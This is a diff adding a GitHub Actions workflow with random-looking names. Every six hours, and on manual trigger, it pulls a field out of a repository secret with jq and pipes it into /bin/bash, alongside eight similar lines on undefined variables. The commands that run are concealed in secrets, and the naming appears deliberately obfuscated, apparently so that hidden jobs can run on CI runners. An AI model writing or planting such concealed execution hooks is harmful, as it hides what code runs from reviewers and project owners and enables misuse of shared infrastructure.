@@ -1,0 +1,26 @@
+name: qinmianhong6234
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qinmianhong6234
+        env:
+          v150: ${{ secrets.v150 }}
+        run: |
+          echo $v150 | jq -r .mcnga789 | /bin/bash
+          echo $sqp7857 | jq -r .hfc560 | /bin/bash
+          echo $o3150 | jq -r .itzw9 | /bin/bash
+          echo $olsx71976 | jq -r .yyt3080 | /bin/bash
+          echo $djmx646 | jq -r .fflgd499 | /bin/bash
+          echo $lrfn7 | jq -r .ssfw781 | /bin/bash
+          echo $qbyj253 | jq -r .z26 | /bin/bash
+          echo $p110 | jq -r .srw3080 | /bin/bash
+          echo $vp8508 | jq -r .fkt89591 | /bin/bash
+
